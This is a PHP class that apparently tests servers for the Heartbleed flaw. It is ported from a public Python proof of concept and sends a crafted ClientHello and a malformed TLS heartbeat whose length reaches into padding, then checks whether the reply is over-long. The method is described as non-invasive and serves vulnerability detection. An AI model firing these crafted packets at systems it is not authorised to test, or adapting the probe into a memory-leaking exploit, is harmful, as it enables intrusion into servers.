<?php
/*
 * HeartBleed Tester Derived/ported from ssltest.py by Jared Stafford http://packetstormsecurity.com/files/126072/TLS-Heartbeat-Proof-Of-Concept.html
 * Credit for concept for non-invasive test to Ivan Ristic
 * Performs a non-invasive test to see if a server is vulnerable to heartbleed.
 *
 * @author Kevin McArthur
 */
class HeartBleed {

    protected $_debug = false;

    /**
     * Print data as human readable hex
     *
     * @param string $data Binary.
     * @param string $newline
     */
    protected function _hexdump($data) {
        $t = $f = '';
        $width = 16;
        $pad = '.';

        for($i = 0; $i <= 0xFF; $i ++) {
            $f .= chr($i);
            $t .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
        }

        $hex = str_split(bin2hex($data), $width * 2);
        $chars = str_split(strtr($data, $f, $t), $width);

        $offset = 0;
        foreach($hex as $i => $line) {
            $byteStr = substr_replace(implode(' ', str_split($line, 2)), ' ', ($width)+(($width/2)-1), 0);
            echo sprintf('%08X', $offset) . '  ' .  sprintf('%-'. (($width*2)+($width)). 's', $byteStr) . '  |' . $chars[$i] . '|' . PHP_EOL;
            $offset += $width;
        }
    }

    /**
     * Receive TLS Message.
     *
     * Reads 5 bytes from the stream. 1 Byte Type, 2 bytes TLS Version, 2 Bytes Length.
     * It also reads the length specified into payload.
     *
     * @param resource $fp A pointer to a socket
     * @return mixed Associative array or false.
     */
    protected function _recvmsg($fp) {
        //Read 5 bytes TLS header.
        $headerRaw = $this->_recvall($fp, 5);
        if($this->_debug) {
            echo "TLS header: ".PHP_EOL;
            $this->_hexdump($headerRaw);
        }
        //Check that 5 bytes were read.
        if(strlen($headerRaw) == 5) {
            //Unpack the header.
            $header = unpack('Ctype/nversion/nlength', $headerRaw);

            if($this->_debug) {
                printf('TLS message: type = %d, ver = %04x, length = %d'. PHP_EOL, $header['type'], $header['version'], $header['length']);
            }

            //Read $header['length'] from socket
            $payload = $this->_recvall($fp, $header['length']);

            if($this->_debug) {
                $this->_hexdump($payload);
            }

            if(!empty($payload)) {
                return array(
                    'type' => $header['type'],
                    'version' => $header['version'],
                    'length' => $header['length'],
                    'payload' => $payload
                );
            }
        }

        return false;

    }

    /**
     * Receive data from stream.
     *
     * @param resource $fp Socket
     * @param int $length Number of bytes to read from socket.
     * @return string
     */
    protected function _recvall($fp, $length) {
        $buf = $data = '';
        $remain = $length + 1;
        while($remain > 0) {
            $buf = fgets($fp, $remain);
            if(empty($buf)) {
                break 1;
            }
            $data .= $buf;
            $remain -= strlen($buf);
        }
        return $data;
    }

    /**
     * Test for heartbleed.
     *
     * @param string $server FQDN or IP, no scheme
     * @param number $port Default 443
     * @return int status
     */
    public function test($server, $port = 443) {
        echo "Testing: " . $server . '. Port: ' . $port . PHP_EOL;

        $errno = $errstr = 0;
        //Suppress errors on open, report with errstr and errno.
        $fp = @fsockopen($server, $port, $errno, $errstr, 5);

        if(!$fp) {
            echo "Error: $errstr ($errno)" . PHP_EOL;
            if(is_resource($fp)) { fclose($fp); }
            return 1;
        } else {
            // ClientHello, etc... (from ssltest.py)
            $data = '16 '. HEARTBLEED_TLS_VERSION .' 00 dc 01 00 00 ';
            $data .= 'd8 '. HEARTBLEED_TLS_VERSION .' 53 ';
            $data .= '43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf';
            $data .= 'bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00';
            $data .= '00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88';
            $data .= '00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c';
            $data .= 'c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09';
            $data .= 'c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44';
            $data .= 'c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c';
            $data .= 'c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11';
            $data .= '00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04';
            $data .= '03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19';
            $data .= '00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08';
            $data .= '00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13';
            $data .= '00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00';
            $data .= '00 0f 00 01 01';

            //Write ClientHello to stream.
            $out = pack("H*", str_replace(array(" ", "\r", "\n"), '', $data));
            fwrite($fp, $out);
            unset($data, $errno, $errstr);

            //Loop until connection closed or ServerHello done.
            //@TODO: Add timeout to loop
            while(true) {
                //Read TLS Message
                $buffer = $this->_recvmsg($fp);

                //If no data, connection closed.
                if($buffer === false) {
                    echo "Server closed connection before ServerHello." . PHP_EOL;
                    if(is_resource($fp)) { fclose($fp); }
                    return 1;
                }

                $payload = $buffer['payload'];
                if($buffer['type'] == 22 && ord($payload[0]) == 0x0e) {
                    if($this->_debug) {
                        echo "Server Hello Done" . PHP_EOL;
                    }
                    break;
                }
            }
            $sslVer = $buffer['version'];
            unset($buffer, $payload);

            /*
             * With a testsize value of 16384, the server does not pad the response to stay under the 2^14 limit,
             * so only data we send is echoed back. With values below 16384 you will get back 16 bytes of
             * what I /think/ is random padding and not heartbleed data.
             * (Needs more research to verify its not 16 bytes of bled memory)
             * Values below 4096 break due to openssl's DEFAULT_BUFFER_SIZE and buffer flushing behavior.
             */

            $payloadRealLength = HEARTBLEED_TEST_SIZE - 3 - HEARTBLEED_PADDING_SIZE;
            $payloadFakeLength = sprintf('%04x', $payloadRealLength + HEARTBLEED_PADDING_SIZE); // Heartbleed into padding space
            $recordLength = 3 + $payloadRealLength + HEARTBLEED_PADDING_SIZE;

            // Send Heartbleed (Non-invasive test method via Ivan Ristic concept)
            $heartbeat = sprintf('18 %04x %04x', $sslVer, $recordLength); // 1 byte heartbeatmessagetype, 2 bytes tls version, 2 bytes message length
            $heartbeat .= "01 " . $payloadFakeLength . " "; // 1 byte heartbeatrequesttype, 2bytes payload length
            $heartbeat .= trim(str_repeat(' 4C ', $payloadRealLength)); // Payload Data (L characters)
            $heartbeat .= trim(str_repeat(' 50 ', HEARTBLEED_PADDING_SIZE)); // Padding Data (P characters)
            unset($payloadFakeLength, $recordLength);

            if($this->_debug) {
                echo "Sending HeartBeat: " . PHP_EOL;
                $this->_hexdump(pack('H*', str_replace(array(" ","\r","\n"), '', $heartbeat)));
            }

            //Send HeartBeat
            fwrite($fp, pack('H*', str_replace(array(" ","\r","\n"), '', $heartbeat)));
            unset($heartbeat);

            //Read TLS messages looking for HeartBeat response or TLS Alert
            while(true) {
                $buffer = $this->_recvmsg($fp);
                if($buffer === false) {
                    echo "Server Closed Connection. Not vulnerable." . PHP_EOL;
                    if(is_resource($fp)) { fclose($fp); }
                    return 0;
                }
                $payload = $buffer['payload'];

                //HeartBeat response type
                if($buffer['type'] == 24) {
                    if($this->_debug) {
                        echo "Received HeartBeat Response. " . PHP_EOL;
                    }
                    /*
                     * Theory of operation is that patched versions check the
                     * message_length - 3 - payload_length >= 16 (as payload /must/ be 16 bytes);
                     * Our packet has a message length - 3 - payload_lenght = 0 and breaks the spec.
                     */
                    if($buffer['length'] > $payloadRealLength) {
                        echo "Vulnerable to heartbleed." . PHP_EOL;
                        if(is_resource($fp)) { fclose($fp); }
                        return 0;
                    } else {
                        echo "Processed but no extra data. Not vulnerable, but accepted bad padding?" . PHP_EOL;
                        if(is_resource($fp)) { fclose($fp); }
                        return 0;
                    }
                }

                //TLS Alert (Most HeartBeat failures don't alert, are silently discarded.
                if($buffer['type'] == 21) {
                    echo 'Received Alert' . PHP_EOL;
                    if(is_resource($fp)) { fclose($fp); }
                    return 1;
                }
            }

        }
    }

    /**
     * Run Command
     *
     * @param Zend_Console_Getopt $getopt
     * @return int Status
     */
    public function run($getopt) {
        if($getopt->c == 'test') {
            $this->_debug = (! empty($getopt->v) ? $getopt->v : false);
            if(! empty($getopt->p)) {
                return $this->test($getopt->s, $getopt->p);
            } else {
                return $this->test($getopt->s);
            }
        }
    }
}
